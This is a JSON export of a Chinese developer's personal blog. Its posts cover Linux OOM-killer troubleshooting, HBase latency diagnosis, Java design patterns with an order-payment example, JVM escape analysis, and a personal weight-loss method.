{"meta":{"title":"一代天骄's BLOG","subtitle":"吾尝终日而思，不如须臾之所学","description":"吾尝终日而思，不如须臾之所学","author":"一代天骄","url":"http://www.hasfun.cn","root":"/"},"pages":[],"posts":[{"title":"Java进程被杀死排查过程","slug":"Java进程被kill排查过程","date":"2020-11-03T15:46:11.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2020/11/03/Java进程被kill排查过程/","link":"","permalink":"http://www.hasfun.cn/2020/11/03/Java进程被kill排查过程/","excerpt":"","text":"相关知识Linux oom-killer 是一种自我保护机制，当系统分配不出内存时(触发条件)会触发这个机制，由操作系统在己有进程中挑选一个占用内存较多，回收内存收益最大的进程kill掉来释放内存。系统为每个进程做评估(/proc//oom_score中数值最大的进程被kill掉。 当发生oom的时候，可以记录在/var/log/messages中，如下： 排查思路 推测原因：进程被kill可能的原因有哪些？ 被人为的 kill -9 pid了，可能性不大，暂不讨论。 操作系统内存不足，触发了oom-killer机制，自动杀死了 验证猜测： 查看操作系统日志/var/log/messages错误日志 排查步骤 查看系统是否宕机或者重启，寻找关键词kmsg started，在xshell输入 # cat /var/log/messages 执行结果如下： 显示结果2020-11-13 10:16有输出kmsg started，即发生过系统重启，这是人为重启，还是操作系统重启呢，我还不能知道。 less一下顺着日志查找异常信息 发现了开头提到的关键词oom killer,根据之前的知识，说明系统曾经内存不足，linux将一些进程杀死了，这就解释了为什么Java进程会被kill。 回到之前的问题，那么重启是什么导致的呢？ 因为是开发机器，使用的人比较多，我猜测是系统内存爆满导致系统不可用，所以有人重启了系统。 还有一种可能，操作系统杀死占内存大的进程后，依然不够申请多余的内存，就会自动重启系统。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.hasfun.cn/tags/Linux/"}]},{"title":"减肥坚持不下去？一个立竿见影的方法","slug":"如何减肥","date":"2020-10-29T14:29:48.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2020/10/29/如何减肥/","link":"","permalink":"http://www.hasfun.cn/2020/10/29/如何减肥/","excerpt":"","text":"大家好，我是vac。 今年29了，程序员一枚，本不以为自己可以「靠年轻吃饭」，随着新进的同事中几个97年的「后浪」，给了我当头一棒。我开始问自己我还年轻吗？我照了下镜子，打量了一下自己，“稀疏的头发，穿着格子衫，休闲裤，还挺着一个大肚子，双下巴上还长满了胡子。” 从我的服装，外形体态和精神状态，我一眼看去像是一个37左右的老大叔。 于是，我决心减肥。 减肥过程中，遇到了很多的困难，让我坚持不下去，下面介绍我是怎么应对的方法。 01 写下坚持不下去的原因举个例子，我当时在备忘录写下了这些： 一个人在跑步路上，会感到孤独； 跑步路上，气喘吁吁的，身体会疲惫的，感觉累； 每天晚上堵着嘴挨饿，抵抗美食的诱惑； 后来遇到平台期，体重没有变化，没有正向反馈，我失去乐趣了； 没有足够强的减肥信念。 如果这些困难，看似很难，但其实「凡事能够写下来的事情，都能找到方案解决掉」。 一个人感到孤独，我买了一个蓝牙耳机，可以听音乐或者节目。 身体会疲惫，就降低跑步速度，将每天跑步的频率降低到每周3次，加入骑行。 饿肚子的话，可以吃点苹果或者鸡蛋，每周允许吃一顿「欺骗餐」可以解馋。 减肥遇到平台期是正常的规律，正视它，调整运动强度，拉长跑步的时长。 没有足够的减肥信念，建立减肥成功后的奖励机制，给自己树立小目标，比如减肥到75kg，犒劳一下自己，升级一下自己的装备，比如体脂秤，运动手表。 值得注意的是，这些困难需要写下来，如果只停留在脑子里，自己会夸大恐惧，只有把困难写下来，我们才能把注意力放在了思考应对方案上来。 02 执行力建立一个指令集，“如果*，就**” ，这样做的好处是我们执行起来很轻松，让大脑放空，不需要经过迟疑，犹豫的过程。 比如， 如果下班了，就提前几站下地铁跑步回家； 如果一周运动了5天，就吃一顿想吃的； 如果体重降到75kg，则买一个小米体脂秤； 如果体重降到70kg，则买一个ipad air 03 总结减肥，是一个苦修行，也是一种证明自己有掌控自己身体的能力。遇到困难，我们面对它，解决它就好了。下面我引用了一本书中的语句，与君共勉： 生活就像去健身房，最痛苦的事情是作出锻炼身体的决定，一旦你过了这一关，以后的事情就好办了。有很多次，我害怕去健身房，但是只要我去了并开始运动，就会感到非常愉快。健身之后我总是很高兴，因为我说服了自己坚持了下来 ——《富爸爸穷爸爸》","categories":[{"name":"生活","slug":"生活","permalink":"http://www.hasfun.cn/categories/生活/"}],"tags":[{"name":"减肥","slug":"减肥","permalink":"http://www.hasfun.cn/tags/减肥/"}]},{"title":"责任链和命令模式在订单系统的实战记录","slug":"责任链项目实战","date":"2020-07-29T08:29:48.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2020/07/29/责任链项目实战/","link":"","permalink":"http://www.hasfun.cn/2020/07/29/责任链项目实战/","excerpt":"","text":"写在前面“纸上得来终觉浅,绝知此事要躬行”. 读完23种设计模式后,感觉肚子还是空空的,不知道无从下手,今天翻了一下之前的博客,曾经记录过关于Apache Commons Chain的使用,它其实基于责任链,命令模式来写的,它很适合做流程化的逻辑代码,比如订单的下单,支付流程以及退款流程,让代码写的很nice,下面把我应用在订单系统的实战记录下,看下对其他人有没有帮助. 概念 Command接口: 1. 命令模式,实现它来执行责任链中某个节点的业务. 2. 主要方法 boolean execute(Context context); return false 会继续执行下一个节点,否则终止. Filter接口: 1. extend command. 2. 比Command接口多了一个方法 boolean postprocess(Context var1, Exception var2);只要Filter的execute方法被调用，不论链的执行过程中是否抛出错误，Commons Chain都将保证Filter的postprocess方法被调用。 ChainBase基类: 它表示“命令链”，要在其中执行的命令，需要先添加到Chain中 Context接口: 它表示命令执行的上下文,在命令间实现共享信息的传递 订单系统支付流程直接上代码了,代码里面有注释,代码可以运行测试 1. pom文件引入&lt;!-- 引入commons-chain即可 --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-chain&lt;/groupId&gt; &lt;artifactId&gt;commons-chain&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;!--Lombok 程序员的高效开发利器 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.12&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 引入 logback日志 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;2.0.0-alpha1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-core&lt;/artifactId&gt; &lt;version&gt;1.3.0-alpha5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;version&gt;1.3.0-alpha5&lt;/version&gt; &lt;/dependency&gt; 2. 订单支付主流程业务逻辑: 订单下单后,应付金额 = 订单总价, 如果使用了优惠券,我们需要把优惠券的金额从支付金额减去,如果还有商旅卡之类营销类卡余额得扣去,最后才是客户应该支付的现金,计算好应该支付的现金后,需要同步订单的信息到公共订单系统,供app查询,app刷到订单系统给的该笔订单的支付开关是打开的,则跳转到收银台,比如微信或者支付宝开始支付,下面我们看下怎么实现的. - OrderPayChain 定义支付流程的步骤 - OrderContext 定义订单的信息上下文:订单总价,已支付的价格,使用的商旅卡价格 - PromotionPayCommand 优惠券支付逻辑 - BusinessPayCommand 商旅卡支付逻辑 - CashPayCommand 现金支付逻辑 - SysncOrderInfoCommand 同步订单信息,打开支付开关 3. 实现过程import org.apache.commons.chain.impl.ChainBase; import java.math.BigDecimal; /** * 这是变异后的责任链和命令模式 * * 它表示“命令链”，要在其中执行的命令，需要先添加到Chain中 */ public class OrderPayChain extends ChainBase { public void init() { //第一步: 扣优惠券 this.addCommand(new PromotionPayCommand()); //第二步:优先商旅卡 this.addCommand(new BusinessPayCommand()); //第三步: 扣现金 this.addCommand(new CashPayCommand()); // 同步订单信息 this.addCommand(new SysncOrderInfoCommand()); } public static void main(String[] args) throws Exception { var refundTicketChain = new OrderPayChain(); refundTicketChain.init(); var context = new OrderContext(); context.setOrderId(1621940242); context.setTotalPrice(BigDecimal.valueOf(100)); refundTicketChain.execute(context); } } import lombok.Data; import org.apache.commons.chain.impl.ContextBase; import java.math.BigDecimal; /** * Context接口。它表示命令执行的上下文,在命令间实现共享信息的传递 */ @Data public class OrderContext extends ContextBase { /** * 订单号 */ private Integer orderId; /** * 订单总价 */ private BigDecimal totalPrice = BigDecimal.ZERO; /** * 该笔订单已经支付的总价 */ private BigDecimal payTotalPrice = BigDecimal.ZERO; /** * 使用商旅卡支付的金额 */ private BigDecimal businessCardPayPrice = BigDecimal.ZERO; } import lombok.extern.slf4j.Slf4j; import org.apache.commons.chain.Context; import org.apache.commons.chain.Filter; import java.math.BigDecimal; @Slf4j public class BusinessPayCommand implements Filter { @Override public boolean execute(Context context) throws Exception { OrderContext orderContext = (OrderContext) context; //查询客户账户下的商旅卡余额,比如查询结果是12.5元 // var bPrice = new BigDecimal(12.5); 禁止这种写法 var bPrice = BigDecimal.valueOf(12.5); //算出还需要支付的价格 var remainPrice = orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice()); //该笔订单,优先商旅卡支付全额 if (bPrice.compareTo(remainPrice) &gt;= 0) { orderContext.setPayTotalPrice(orderContext.getPayTotalPrice().add(remainPrice)); orderContext.setBusinessCardPayPrice(remainPrice); if (log.isDebugEnabled()) { log.debug(&quot;订单orderId:{} ,订单总价:{},使用商旅卡支付了：{},还需要支付:{}&quot;,orderContext.getOrderId(),orderContext.getTotalPrice(),orderContext.getBusinessCardPayPrice(),orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice())); } return true; }else { // 使用商旅卡支付部分 orderContext.setPayTotalPrice(orderContext.getPayTotalPrice().add(bPrice)); orderContext.setBusinessCardPayPrice(bPrice); if (log.isDebugEnabled()) { log.debug(&quot;订单orderId:{} ,订单总价:{},使用商旅卡支付了：{},还需要支付:{}&quot;,orderContext.getOrderId(),orderContext.getTotalPrice(),orderContext.getBusinessCardPayPrice(),orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice())); } return false; } } @Override public boolean postprocess(Context context, Exception e) { OrderContext orderContext = (OrderContext) context; var businessCardPayPrice = orderContext.getBusinessCardPayPrice(); // 请求扣除账户下商旅卡 //httpClient.post(&quot;/api/businessCard/reduce&quot;,businessCardPayPrice); return false; } } import lombok.extern.slf4j.Slf4j; import org.apache.commons.chain.Command; import org.apache.commons.chain.Context; import java.math.BigDecimal; @Slf4j public class PromotionPayCommand implements Command { @Override public boolean execute(Context context) throws Exception { OrderContext orderContext = (OrderContext) context; //查询客户账户下的优惠券余额,比如查询结果是10元 var bPrice = BigDecimal.valueOf(10); //算出还需要支付的价格 var remainPrice = orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice()); //该笔订单,优先商旅卡支付全额 if (bPrice.compareTo(remainPrice) &gt;= 0) { orderContext.setPayTotalPrice(orderContext.getPayTotalPrice().add(remainPrice)); orderContext.setBusinessCardPayPrice(remainPrice); if (log.isDebugEnabled()) { log.debug(&quot;订单orderId:{} ,订单总价:{},使用优惠券支付了：{},还需要支付:{}&quot;,orderContext.getOrderId(),orderContext.getTotalPrice(),orderContext.getBusinessCardPayPrice(),orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice())); } return true; }else { // 使用商旅卡支付部分 orderContext.setPayTotalPrice(orderContext.getPayTotalPrice().add(bPrice)); orderContext.setBusinessCardPayPrice(bPrice); if (log.isDebugEnabled()) { log.debug(&quot;订单orderId:{} ,订单总价:{},使用优惠券支付了：{},还需要支付:{}&quot;,orderContext.getOrderId(),orderContext.getTotalPrice(),orderContext.getBusinessCardPayPrice(),orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice())); } return false; } } } import lombok.extern.slf4j.Slf4j; import org.apache.commons.chain.Command; import org.apache.commons.chain.Context; import org.apache.commons.chain.Filter; import java.math.BigDecimal; @Slf4j public class CashPayCommand implements Filter { @Override public boolean execute(Context context) throws Exception { OrderContext orderContext = (OrderContext) context; //算出还需要支付的现金 var remainPrice = orderContext.getTotalPrice().subtract(orderContext.getPayTotalPrice()); if (log.isDebugEnabled()) { log.debug(&quot;订单orderId:{} ,订单总价:{},还需要支付现金:{}&quot;,orderContext.getOrderId(),orderContext.getTotalPrice(),remainPrice); } return false; } @Override public boolean postprocess(Context context, Exception e) { log.info(&quot;打开支付开关,客户端引导跳转收银台去支付&quot;); return false; } } import lombok.extern.slf4j.Slf4j; import org.apache.commons.chain.Command; import org.apache.commons.chain.Context; @Slf4j public class SysncOrderInfoCommand implements Command { @Override public boolean execute(Context context) throws Exception { if (log.isDebugEnabled()) { log.debug(&quot;同步子系统订单信息到公共订单系统&quot;); } return false; } } 测试[PromotionPayCommand.java:33]2020-07-29 16:26:45.982 [DEBUG] {main} 订单orderId:1621940242 ,订单总价:100,使用优惠券支付了：10,还需要支付:90 [BusinessPayCommand.java:36]2020-07-29 16:26:45.992 [DEBUG] {main} 订单orderId:1621940242 ,订单总价:100,使用商旅卡支付了：12.5,还需要支付:77.5 [CashPayCommand.java:19]2020-07-29 16:26:45.993 [DEBUG] {main} 订单orderId:1621940242 ,订单总价:100,还需要支付现金:77.5 [SysncOrderInfoCommand.java:12]2020-07-29 16:26:45.994 [DEBUG] {main} 同步子系统订单信息到公共订单系统 [CashPayCommand.java:26]2020-07-29 16:26:45.994 [INFO] {main} 打开支付开关,客户端引导跳转收银台去支付","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://www.hasfun.cn/tags/设计模式/"}]},{"title":"habase应用查询慢，hbase shell查询快","slug":"habase应用查询慢hbase-shell查询快","date":"2020-07-02T15:49:48.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2020/07/02/habase应用查询慢hbase-shell查询快/","link":"","permalink":"http://www.hasfun.cn/2020/07/02/habase应用查询慢hbase-shell查询快/","excerpt":"","text":"问题现象今天早上，我还在上班路上，测试老大在群里面喊，xx应用仿真环境访问不了，并且截图了log日志，我看了一下是dubbo服务访问超时 ，第一反应是dubbo服务挂了，找运维重启，重启后无果，然后等我去了公司，看了详细日志，是dubbo接口响应时长达到6s，明明是测试通过的接口，接口性能不可能这样慢， 分析了下这个接口功能，是直连hbase查询，还是rowkey的get查询，应该是几十毫秒内响应。遇到此类，本来好好的，现在不行的问题，一般都是一脸问号，没办法，只能撸起袖子找原因了。 第一步：hbase数据量是否大了，接口rowkey查询性能问题。我连到了hbase服务器上，执行hbase shell get &quot;db.user_acc_profit&quot;,&quot;23342_1_9&quot; 耗时 15ms。 count &quot;db.user_acc_profit&quot; 1200 rows 完蛋，hbase没有问题，才1200条数据。只能检查代码去，是否有慢查。 第二步：检查代码逻辑，是否有慢查看了下代码，只是单rowkey查询，没有任何慢查，此时，我陷入了迷茫了，只能靠猜了，我先去开发环境，执行该接口，发现没有问题，只能说明仿真环境真的有问题，但是问题到底是什么，我不知道。 第三步：网络传输经验告诉我，此时不要慌，先把问题捋清楚， 当前的现象是： 同样的代码，在开发执行hbase查询很快，在仿真很慢。 单个hbase shell查询很快，说明hbase本身没有问题 根据这2点分析，hbase 自身shell 命令查询很快，但是应用查询慢，说明问题出现在应用与hbase的交互上，是网络传输做了限制吗？ 带着这个问题，询问了运维，答案是no。我怀疑是dns配置的问题，运维的回答是这台机器用的是本地host解析的ip。就此打断了我对网络的猜测。 第四步：hbase服务器健康状态接着，我又问了管理hbase的运维老师，他打开监控页面，告诉我，hbase服务器很健康。我去hbase服务器上查了下cpu负载 top 了一下，cpu很正常。又查了一下服务器内存，free -m ，内存也是足够的，又查了下磁盘，df -h ,也正常。 由于hbase是集群的，服务器比较多，我只是抽查了几台，问题就出在抽查。 后来不经意，通过程序里面配置的几台hbase的服务ip，发现有一台服务器宕机了，询问了一下前面管hbase的运维老师，他告诉我这台机器运营商硬件故障一直没有恢复，也没办法恢复了，查到这里，仿佛破云见雾般的感觉，我捋顺了思路：hbase shell查询快，说明单机的hbase服务器快，而我之前忽视了程序访问的是一个hbase集群来查询的，如果单台机器挂了，每次发起查询命令的时候，都会从配置的集群列表里面选取一台去查询，然而某台机器挂了，就会重试，重试失败后，再选择其他健康服务器去接着查询，所以出现了habse查询响应慢的现象。 然后，我找运维老师把程序的hbase配置给改了一下后，测试了下程序，查询速度恢复正常了。 总结公司的服务器维护治理，存在问题，此类服务器停机没有及时更新应用配置。 我在思考，为啥我花了那么久才查找问题，不能第一时间抓住要害。 当我看到“shell 命令查询没问题，应用程序查询有问题”情形，我的脑回路没有立刻提取到有用的信息：“hbase shell查询的单机，应用查询是走的集群查询”，是因为我没有这个常识吗？不是的。也许这就是知识与实践结合的原因，最后送自己一句话，“你知道不代表你会”。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"hbase","slug":"hbase","permalink":"http://www.hasfun.cn/tags/hbase/"}]},{"title":"设计模式-策略模式与工厂模式结合","slug":"设计模式-策略模式与工厂模式结合","date":"2020-06-23T09:31:43.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2020/06/23/设计模式-策略模式与工厂模式结合/","link":"","permalink":"http://www.hasfun.cn/2020/06/23/设计模式-策略模式与工厂模式结合/","excerpt":"","text":"设计模式-策略模式与工厂模式结合策略模式有个弱点,就是使用方需要知道所有的策略算法,这不符合迪米特原则. 可以借助工厂模式,创建出策略类,使得使用方与实现方解耦,让其满足迪米特原则 这么说,有点抽象,下面举例子 普通策略类 策略模式中的重要角色:context public class Context { private Strategy strategy; public Context(Strategy strategy){ this.strategy = strategy; } public void exect(){ strategy.excute(); } } 客户端调用 public class Client { public static void main(String[] args) { Context context = new Context(new AddStrategy()); // 需要知道具体策略类 context.exect(); } } 加入工厂模式 工厂类 public class StrategyFactory { public Strategy getStrategy(String opt) { if (opt.equals(&quot;+&quot;)) { return new AddStrategy(); } if (opt.equals(&quot;*&quot;)) { return new MultStrategy(); } return null; } } 客户端 public class Client { public static void main(String[] args) { StrategyFactory strategyFactory = new StrategyFactory(); strategyFactory.getStrategy(&quot;*&quot;).excute(); // 这样就达到了&quot;屏蔽实现细节,面向抽象编程&quot; } }","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://www.hasfun.cn/tags/设计模式/"}]},{"title":"聊聊逃逸分析","slug":"逃逸分析","date":"2020-06-23T09:31:43.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2020/06/23/逃逸分析/","link":"","permalink":"http://www.hasfun.cn/2020/06/23/逃逸分析/","excerpt":"","text":"逃逸分析Java对象一般都是在堆中分配内存,但是也不一定,jvm做了一些优化,将一些对象通过逃逸分析,直接在栈上分配.也就少了内存拷贝,加快了jvm的运行速度.直接上代码 public class EscapeAnalysisTest { public static void main(String[] args) { long curtime = System.currentTimeMillis(); for (int i = 0; i &lt; 10000000; i++) { byte[] b = new byte[2]; } System.out.println((System.currentTimeMillis()-curtime) + &quot;ms&quot;); } } 开启逃逸分析-Xmx10m -Xms10m -Xlog:gc -XX:+DoEscapeAnalysis [0.017s][info][gc] Using G1 [0.042s][info][gc] Periodic GC disabled [0.155s][info][gc] GC(0) Pause Young (Normal) (G1 Evacuation Pause) 4M-&gt;1M(10M) 3.230ms [0.169s][info][gc] GC(1) Pause Young (Normal) (G1 Evacuation Pause) 3M-&gt;1M(10M) 2.557ms 12ms 共耗时12ms 关闭逃逸分析-Xmx10m -Xms10m -Xlog:gc -XX:-DoEscapeAnalysis [0.015s][info][gc] Using G1 [0.038s][info][gc] Periodic GC disabled [0.143s][info][gc] GC(0) Pause Young (Normal) (G1 Evacuation Pause) 4M-&gt;1M(10M) 2.461ms [0.147s][info][gc] GC(1) Pause Young (Normal) (G1 Evacuation Pause) 3M-&gt;1M(10M) 2.036ms [0.149s][info][gc] GC(2) Pause Young (Normal) (G1 Evacuation Pause) 3M-&gt;1M(10M) 0.732ms [0.150s][info][gc] GC(3) Pause Young (Normal) (G1 Evacuation Pause) 4M-&gt;1M(10M) 0.651ms [0.151s][info][gc] GC(4) Pause Young (Normal) (G1 Evacuation Pause) 4M-&gt;1M(10M) 0.500ms [0.153s][info][gc] GC(5) Pause Young (Normal) (G1 Evacuation Pause) 5M-&gt;1M(10M) 0.666ms [0.154s][info][gc] GC(6) Pause Young (Normal) (G1 Evacuation Pause) 5M-&gt;1M(10M) 0.476ms [0.156s][info][gc] GC(7) Pause Young (Normal) (G1 Evacuation Pause) 6M-&gt;1M(10M) 0.664ms [0.158s][info][gc] GC(8) Pause Young (Normal) (G1 Evacuation Pause) 6M-&gt;1M(10M) 0.491ms [0.159s][info][gc] GC(9) Pause Young (Normal) (G1 Evacuation Pause) 6M-&gt;1M(10M) 0.493ms [0.160s][info][gc] GC(10) Pause Young (Normal) (G1 Evacuation Pause) 6M-&gt;1M(10M) 0.475ms [0.162s][info][gc] GC(11) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.433ms [0.164s][info][gc] GC(12) Pause Young (Normal) (G1 Evacuation Pause) 6M-&gt;1M(10M) 0.447ms [0.165s][info][gc] GC(13) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.466ms [0.167s][info][gc] GC(14) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.412ms [0.168s][info][gc] GC(15) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.462ms [0.169s][info][gc] GC(16) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.527ms [0.171s][info][gc] GC(17) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.512ms [0.173s][info][gc] GC(18) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.456ms [0.174s][info][gc] GC(19) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.445ms [0.176s][info][gc] GC(20) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.469ms [0.177s][info][gc] GC(21) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.465ms [0.179s][info][gc] GC(22) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.471ms [0.180s][info][gc] GC(23) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.415ms [0.182s][info][gc] GC(24) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.389ms [0.183s][info][gc] GC(25) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.400ms [0.185s][info][gc] GC(26) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.378ms [0.186s][info][gc] GC(27) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.373ms [0.187s][info][gc] GC(28) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.324ms [0.189s][info][gc] GC(29) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.354ms [0.190s][info][gc] GC(30) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.391ms [0.192s][info][gc] GC(31) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.410ms [0.193s][info][gc] GC(32) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.382ms [0.195s][info][gc] GC(33) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.325ms [0.196s][info][gc] GC(34) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.417ms [0.197s][info][gc] GC(35) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.373ms [0.199s][info][gc] GC(36) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.418ms [0.200s][info][gc] GC(37) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.323ms [0.202s][info][gc] GC(38) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.364ms [0.203s][info][gc] GC(39) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.396ms [0.204s][info][gc] GC(40) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.341ms [0.206s][info][gc] GC(41) Pause Young (Normal) (G1 Evacuation Pause) 7M-&gt;1M(10M) 0.370ms 73ms 共耗时73ms,比开启逃逸分析慢了6倍.","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"http://www.hasfun.cn/tags/JVM/"}]},{"title":"聊聊设计模式的本质","slug":"design-pattern","date":"2020-06-08T09:31:43.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2020/06/08/design-pattern/","link":"","permalink":"http://www.hasfun.cn/2020/06/08/design-pattern/","excerpt":"","text":"什么是设计模式？设计模式就是前人总结的代码设计的模型，就像武侠里面的武功的招式，套路。 为什么需要设计模式啊？我平时代码敲的也没有问题啊，功能也完成了，线上跑的很健康 1、统一编程风格实现功能，这属于硬编码，没有什么技巧，形成不了模式，只能说是个copyer，复制人。大部分代码都是cv的。不能称得上工程师，你敲的代码不能成为工程级别的项目。可能你写的代码只能你自己看得懂，如果你的命名不规范的化，就会形成自己的一套代码风格。 2、易维护，行内统一语言如果你使用设计模式，大家的代码风格统一了，大家都有了共识，理解代码的结构也很轻松，不过这里有个大前提，就是你的团队，都懂设计模式。 3、代码更优雅设计模式，让你的代码更优雅，比如建造者模式 HttpClient.builder().url(&quot;&lt;http://aliserver/api/user/query&gt;&quot;) .method(Method.GET) .parameter(Map.of(&quot;uuid&quot;, &quot;432231&quot;, &quot;key&quot;, &quot;di2da2ddsa3s&quot;)) .build(); 4、可扩展性强，轻松应对多变需求设计模式，可以让代码写的复用性好，可扩展性强。说白了，就是面对多变的需求，你可以改动很少的代码就能适应新需求，就像汽车的部件一样，代码功能块就像汽车部件了，拆拆装装，就产生新的新特的汽车。这样的代码，老板喜欢，因为节省开发成本，减少人力；深受同行吹捧，因为这已经成为工匠打磨的作品。 怎么使用设计模式从我学习设计模式的经验，记住概念，记住类图 ，很容易忘记，容易混淆各个设计模式。后来发现，记住设计模式的本质是很重要的，让围绕这个本质，再去看这些设计模式，比较容易吸收点。 设计模式的目标：让代码，维护成本低，面对多变需求，可扩展性强. 设计模式的本质：面向抽象，隔离实现 用白话解释就是，设计模式都是抽象类，接口来组织代码关系，实现层都是被隐藏的，也就是隐藏细节，面向抽象层。那么为什么要面向抽象，隔离实现呢？ 因为抽象是稳定的,实现层是具体的细节，是多变的。 举个例子，用户登录注册这样的需求，抽象出来，就是用户服务：userService，有login（），register（）。然后我们提测，测试经过数天的功能测试，回归测试，生产验证，功能发布成功， 这是不变的方法吧。如果要来了一个微信登录这些细节的时候，那么user这个类就不稳定了。所以我们设计成abstract userService，wxUserService，qqUserService。 可以做到面对多变需求，动态扩展，不需要修改原有的类，避免了维护原有类，测试原有功能的工作量。 然后为了“面向抽象，隔离实现”这个目标，先人提出了设计原则 我们开发一个订单系统的项目，经过需求评审，代码实现，单元测试，功能测试，线上运行，投入了很多的人力成本，才交出了stabale稳定的代码。 现在需要添加一个功能，作为老板，或者管理人员，我们希望不要修改原有功能模块的代码，这样增加了回归已有功能的工作量，也增加了线上原有功能影响的风险，所以期望只在原有基础扩展现有功能。 这里，就得提到，开发程序要符合开闭原则，做到不修改，只扩展。 要做到开闭原则，就得引出设计原则：单一职责，我们定义的类的功能边界要明确，职责清晰，这样面对多变的需求变动的可能性就小，比如下单功能，orderService只负责订单的创建订单，修改订单功能，如果还参杂着的物流信息的功能，下次如果物流功能变更，就会牵扯到订单功能。 上面我们提到了，抽象是稳定的，实现是多变的，所以引出了依赖倒置的原则，我们定义的类与类之间，是通过抽象层产生关系，抽象层不依赖实现类，实现类要依赖抽象层，体现了“面向抽象，隔离实现” 还有接口隔离原则，接口的实现类，不要实现跟自己无关的抽象方法，类的继承也要做到尽可能少的继承与自己无关的方法，这样做也是为了减少上层的变动影响了下层。 在程序开发中，类与类之间肯定会产生关系，就难免产生耦合，类之间关系越复杂，牵涉到某功能变动，就会影响，不符合开闭原则，所以我们约定类与类之间尽可能少的产生依赖关系，只与自己直接关系的类有依赖关系，这也就是迪米特法则，也就是最小知道原则， 类的继承，是强耦合的东西，给程序带入了侵入型，基类的方法，被子类继承，如果继承的方法发生变更，子类功能都会受影响，所以我们约定了 子类继承基类，只能继承原有方法，新增新的功能方法，不得重写父类的功能方法，这就是里氏替换原则：出现基类的地方，子类能替换。 合成复用原则：少用继承，多用合成，依赖关系，为了减少耦合的可能性。 